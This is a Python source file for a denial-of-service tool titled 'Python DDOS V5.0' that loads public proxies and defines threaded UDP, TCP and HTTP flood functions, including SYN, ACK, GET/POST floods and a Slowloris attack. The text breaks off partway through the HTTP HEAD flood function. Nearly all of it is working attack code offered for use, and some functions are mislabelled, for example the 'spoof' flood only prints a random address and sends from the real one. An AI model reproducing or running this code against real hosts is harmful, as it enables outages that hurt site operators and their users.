# (c) 2026 IxilaA1 - Tous droits réservés / All rights reserved / Todos los derechos reservados.
# Ce code ne peut être ni vendu, ni modifié, ni partagé sans autorisation, ni publié à votre nom.
# This code may not be sold, modified, or shared without authorization, nor published under your name.
# Este código no puede ser vendido, modificado ni compartido sin autorización, ni publicado a su nombre.
# -------------------------------------------------------------------------------------------------------
import socket
import random
import time
import threading
import requests
from colorama import init, Fore, Style
from datetime import datetime
import sys

# Initialize Colorama
init(autoreset=True)

# Set window title
print(f"\033]0;Python DDOS V5.0 By Blue Spider\007", end="", flush=True)

# Statistics tracking
class AttackStats:
    def __init__(self):
        self.sent = 0
        self.timeouts = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.start_time = None
        
    def increment_sent(self):
        with self.lock:
            self.sent += 1
            
    def increment_timeout(self):
        with self.lock:
            self.timeouts += 1
            
    def increment_error(self):
        with self.lock:
            self.errors += 1
            
    def get_stats(self):
        with self.lock:
            return self.sent, self.timeouts, self.errors
            
    def start(self):
        self.start_time = time.time()
        self.sent = 0
        self.timeouts = 0
        self.errors = 0

# Global stats instance
stats = AttackStats()

# ASCII Art
ASCII_ART = f"""
{Fore.RED}·▄▄▄▄  ·▄▄▄▄        .▄▄ · 
██▪ ██ ██▪ ██ ▪     ▐█ ▀. 
▐█· ▐█▌▐█· ▐█▌ ▄█▀▄ ▄▀▀▀█▄
██. ██ ██. ██ ▐█▌.▐▌▐█▄▪▐█
▀▀▀▀▀• ▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ {Fore.YELLOW}
       Python DDOS V5.0 - Made by Blue Spider
{Fore.CYAN}═══════════════════════════════════════════════{Style.RESET_ALL}
"""

# Stats display thread
def stats_display(duration):
    """Display real-time statistics"""
    end_time = time.time() + duration
    while time.time() < end_time:
        sent, timeouts, errors = stats.get_stats()
        elapsed = int(time.time() - stats.start_time)
        remaining = max(0, int(duration - elapsed))
        
        # Clear line and display stats
        sys.stdout.write(f"\r{Fore.CYAN}[📊] Sent: {Fore.GREEN}{sent} {Fore.CYAN}| Timeouts: {Fore.YELLOW}{timeouts} {Fore.CYAN}| Errors: {Fore.RED}{errors} {Fore.CYAN}| Elapsed: {elapsed}s | Remaining: {remaining}s{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.1)
    
    # Final stats
    sent, timeouts, errors = stats.get_stats()
    print(f"\n{Fore.GREEN}[✅] Attack completed! Final stats - Sent: {sent} | Timeouts: {timeouts} | Errors: {errors}{Style.RESET_ALL}")

# Download proxies
def fetch_proxies():
    url = "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt"
    try:
        print(f"{Fore.YELLOW}[ℹ️] Fetching proxies...{Style.RESET_ALL}")
        response = requests.get(url, timeout=5)
        proxies = response.text.splitlines()
        valid_proxies = [p for p in proxies if ":" in p]
        print(f"{Fore.GREEN}[✅] Loaded {len(valid_proxies)} proxies{Style.RESET_ALL}")
        return valid_proxies
    except Exception as e:
        print(Fore.RED + f"[❌] Failed to fetch proxies: {e}")
        return []

PROXIES = fetch_proxies()

# UDP Flood Methods
def udp_plain_flood(ip, port, duration, packet_size):
    stats.start()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)  # Add timeout
    end_time = time.time() + duration
    payload = b"A" * packet_size
    
    print(Fore.CYAN + f"\n[🚀] UDP Plain Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    # Start stats display thread
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            try:
                sock.sendto(payload, (ip, port))
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] Packet {stats.sent} sent to {ip}:{port} | Size: {packet_size} bytes{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Timeout on packet {stats.sent + stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")
    finally:
        sock.close()

def udp_random_flood(ip, port, duration, packet_size):
    stats.start()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] UDP Random Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            try:
                payload = random.randbytes(packet_size)
                sock.sendto(payload, (ip, port))
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] Random packet {stats.sent} sent | Size: {packet_size} bytes{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Timeout on packet {stats.sent + stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")
    finally:
        sock.close()

def udp_burst_flood(ip, port, duration, packet_size):
    stats.start()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] UDP Burst Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            for i in range(10):
                try:
                    payload = random.randbytes(packet_size)
                    sock.sendto(payload, (ip, port))
                    stats.increment_sent()
                    print(f"{Fore.GREEN}[✓] Burst packet {stats.sent} sent (batch {i+1}/10){Style.RESET_ALL}")
                except socket.timeout:
                    stats.increment_timeout()
                    print(f"{Fore.YELLOW}[⏰] Timeout in burst {i+1}{Style.RESET_ALL}")
                except Exception as e:
                    stats.increment_error()
                    print(f"{Fore.RED}[❌] Error in burst: {e}{Style.RESET_ALL}")
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")
    finally:
        sock.close()

def udp_spoof_flood(ip, port, duration, packet_size):
    stats.start()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] UDP Spoof Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below (Spoof simulated):" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            try:
                payload = random.randbytes(packet_size)
                sock.sendto(payload, (ip, port))
                stats.increment_sent()
                spoof_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                print(f"{Fore.GREEN}[✓] Packet {stats.sent} sent from spoofed IP {spoof_ip}{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Timeout on spoof packet {stats.sent + stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")
    finally:
        sock.close()

def udp_frag_flood(ip, port, duration, packet_size):
    stats.start()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] UDP Frag Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            try:
                payload = random.randbytes(packet_size // 2)
                sock.sendto(payload, (ip, port))
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] Fragment 1/{stats.sent} sent{Style.RESET_ALL}")
                
                sock.sendto(payload, (ip, port))
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] Fragment 2/{stats.sent} sent{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Timeout on fragment pair {stats.sent//2 + 1}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")
    finally:
        sock.close()

def udp_pulse_flood(ip, port, duration, packet_size):
    stats.start()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] UDP Pulse Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            for i in range(5):
                try:
                    sock.sendto(payload, (ip, port))
                    stats.increment_sent()
                    print(f"{Fore.GREEN}[✓] Pulse packet {i+1}/5 in burst {stats.sent//5 + 1}{Style.RESET_ALL}")
                except socket.timeout:
                    stats.increment_timeout()
                    print(f"{Fore.YELLOW}[⏰] Timeout on pulse packet {i+1}{Style.RESET_ALL}")
                except Exception as e:
                    stats.increment_error()
                    print(f"{Fore.RED}[❌] Error: {e}{Style.RESET_ALL}")
            time.sleep(random.uniform(0.05, 0.2))
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")
    finally:
        sock.close()

def udp_echo_flood(ip, port, duration, packet_size):
    stats.start()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    end_time = time.time() + duration
    payload = b"ECHO" + random.randbytes(packet_size - 4)
    
    print(Fore.CYAN + f"\n[🚀] UDP Echo Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            try:
                sock.sendto(payload, (ip, port))
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] Echo packet {stats.sent} sent with 'ECHO' prefix{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Timeout on echo packet {stats.sent + stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")
    finally:
        sock.close()

def udp_multicast_flood(ip, port, duration, packet_size):
    stats.start()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] UDP Multicast Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            multicast_ip = f"224.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            try:
                payload = random.randbytes(packet_size)
                sock.sendto(payload, (multicast_ip, port))
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] Multicast packet {stats.sent} sent to {multicast_ip}{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Timeout on multicast packet {stats.sent + stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")
    finally:
        sock.close()

# TCP Flood Methods
def tcp_syn_flood_single(ip, port, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] TCP SYN Flood (Single) on {ip}:{port} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            try:
                result = sock.connect_ex((ip, port))
                if result == 0:
                    stats.increment_sent()
                    print(f"{Fore.GREEN}[✓] SYN packet {stats.sent} sent - Connection established{Style.RESET_ALL}")
                else:
                    stats.increment_timeout()
                    print(f"{Fore.YELLOW}[⏰] SYN timeout {stats.timeouts} - Port might be filtered{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] SYN timeout {stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] SYN error: {e}{Style.RESET_ALL}")
            finally:
                sock.close()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")

def tcp_syn_flood_multi(ip, port, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] TCP SYN Flood (Multi) on {ip}:{port} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    def syn_worker(thread_id):
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            try:
                result = sock.connect_ex((ip, port))
                if result == 0:
                    stats.increment_sent()
                    print(f"{Fore.GREEN}[✓] Thread {thread_id}: SYN packet {stats.sent} sent{Style.RESET_ALL}")
                else:
                    stats.increment_timeout()
                    print(f"{Fore.YELLOW}[⏰] Thread {thread_id}: SYN timeout {stats.timeouts}{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Thread {thread_id}: SYN timeout{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Thread {thread_id}: Error: {e}{Style.RESET_ALL}")
            finally:
                sock.close()
    
    threads = []
    for i in range(10):
        t = threading.Thread(target=syn_worker, args=(i+1,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        for t in threads:
            t.join(timeout=1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")

def tcp_data_flood_single(ip, port, duration, packet_size):
    stats.start()
    end_time = time.time() + duration
    payload = random.randbytes(packet_size)
    
    print(Fore.CYAN + f"\n[🚀] TCP Data Flood (Single) on {ip}:{port} | {packet_size} bytes | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((ip, port))
        print(f"{Fore.GREEN}[✓] Connection established to {ip}:{port}{Style.RESET_ALL}")
        
        while time.time() < end_time:
            try:
                sock.send(payload)
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] Data packet {stats.sent} sent | Size: {packet_size} bytes{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Send timeout on packet {stats.sent + stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Send error: {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[❌] Connection error: {e}{Style.RESET_ALL}")
    finally:
        sock.close()

def tcp_data_flood_multi(ip, port, duration, packet_size):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] TCP Data Flood (Multi) on {ip}:{port} | {packet_size} bytes | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    def data_worker(thread_id):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            payload = random.randbytes(packet_size)
            print(f"{Fore.GREEN}[✓] Thread {thread_id}: Connected{Style.RESET_ALL}")
            
            while time.time() < end_time:
                try:
                    sock.send(payload)
                    stats.increment_sent()
                    print(f"{Fore.GREEN}[✓] Thread {thread_id}: Packet {stats.sent} sent{Style.RESET_ALL}")
                except socket.timeout:
                    stats.increment_timeout()
                    print(f"{Fore.YELLOW}[⏰] Thread {thread_id}: Send timeout{Style.RESET_ALL}")
                except Exception as e:
                    stats.increment_error()
                    print(f"{Fore.RED}[❌] Thread {thread_id}: Send error: {e}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[❌] Thread {thread_id}: Connection error: {e}{Style.RESET_ALL}")
        finally:
            sock.close()
    
    threads = []
    for i in range(10):
        t = threading.Thread(target=data_worker, args=(i+1,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        for t in threads:
            t.join(timeout=1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")

def tcp_ack_flood(ip, port, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] TCP ACK Flood on {ip}:{port} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((ip, port))
        print(f"{Fore.GREEN}[✓] Connection established{Style.RESET_ALL}")
        
        while time.time() < end_time:
            try:
                sock.send(b"\x00" * 10)
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] ACK packet {stats.sent} sent{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] ACK timeout {stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] ACK error: {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[❌] Connection error: {e}{Style.RESET_ALL}")
    finally:
        sock.close()

def tcp_rst_flood(ip, port, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] TCP RST Flood on {ip}:{port} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                sock.connect_ex((ip, port))
                sock.close()
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] RST packet {stats.sent} sent - Connection closed with RST{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] RST timeout {stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] RST error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")

def tcp_xmas_flood(ip, port, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] TCP XMAS Flood on {ip}:{port} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((ip, port))
        print(f"{Fore.GREEN}[✓] Connection established{Style.RESET_ALL}")
        
        while time.time() < end_time:
            try:
                sock.send(b"\xFF" * 10)
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] XMAS packet {stats.sent} sent (FIN+URG+PSH flags simulated){Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] XMAS timeout {stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] XMAS error: {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[❌] Connection error: {e}{Style.RESET_ALL}")
    finally:
        sock.close()

def tcp_fin_flood(ip, port, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] TCP FIN Flood on {ip}:{port} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((ip, port))
        print(f"{Fore.GREEN}[✓] Connection established{Style.RESET_ALL}")
        
        while time.time() < end_time:
            try:
                sock.send(b"\x01" * 10)
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] FIN packet {stats.sent} sent (FIN flag simulated){Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] FIN timeout {stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] FIN error: {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[❌] Connection error: {e}{Style.RESET_ALL}")
    finally:
        sock.close()

def tcp_psh_flood(ip, port, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] TCP PSH Flood on {ip}:{port} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((ip, port))
        print(f"{Fore.GREEN}[✓] Connection established{Style.RESET_ALL}")
        
        while time.time() < end_time:
            try:
                sock.send(b"\x08" * 10)
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] PSH packet {stats.sent} sent (PSH flag simulated){Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] PSH timeout {stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] PSH error: {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[❌] Connection error: {e}{Style.RESET_ALL}")
    finally:
        sock.close()

def tcp_window_flood(ip, port, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] TCP Window Flood on {ip}:{port} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((ip, port))
        print(f"{Fore.GREEN}[✓] Connection established{Style.RESET_ALL}")
        
        while time.time() < end_time:
            window_size = random.randint(1, 100)
            try:
                sock.send(b"\x00" * window_size)
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] Window packet {stats.sent} sent with window size {window_size}{Style.RESET_ALL}")
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Window timeout {stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Window error: {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[❌] Connection error: {e}{Style.RESET_ALL}")
    finally:
        sock.close()

# HTTP/HTTPS Flood Methods
def http_get_flood(url, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] HTTP GET Flood on {url} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            try:
                response = requests.get(url, timeout=1)
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] GET request {stats.sent} sent | Status: {response.status_code}{Style.RESET_ALL}")
            except requests.exceptions.Timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] GET timeout {stats.timeouts}{Style.RESET_ALL}")
            except requests.exceptions.ConnectionError:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] GET connection error (timeout){stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] GET error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")

def http_post_flood(url, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] HTTP POST Flood on {url} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            try:
                response = requests.post(url, data={"flood": "data" * 100}, timeout=1)
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] POST request {stats.sent} sent | Status: {response.status_code}{Style.RESET_ALL}")
            except requests.exceptions.Timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] POST timeout {stats.timeouts}{Style.RESET_ALL}")
            except requests.exceptions.ConnectionError:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] POST connection error (timeout){stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] POST error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")

def https_slowloris(url, duration):
    stats.start()
    end_time = time.time() + duration
    sockets = []
    
    print(Fore.CYAN + f"\n[🚀] HTTPS Slowloris on {url} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        host = url.split("/")[2]
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((host, 443))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
                sockets.append(sock)
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] Slowloris connection {stats.sent} opened{Style.RESET_ALL}")
                time.sleep(0.1)
            except socket.timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Slowloris timeout {stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Slowloris error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")
    finally:
        for sock in sockets:
            sock.close()

def http_head_flood(url, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] HTTP HEAD Flood on {url} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            try:
                response = requests.head(url, timeout=1)
                stats.increment_sent()
                print(f"{Fore.GREEN}[✓] HEAD request {stats.sent} sent | Status: {response.status_code}{Style.RESET_ALL}")
            except requests.exceptions.Timeout:
                stats.increment_timeout()
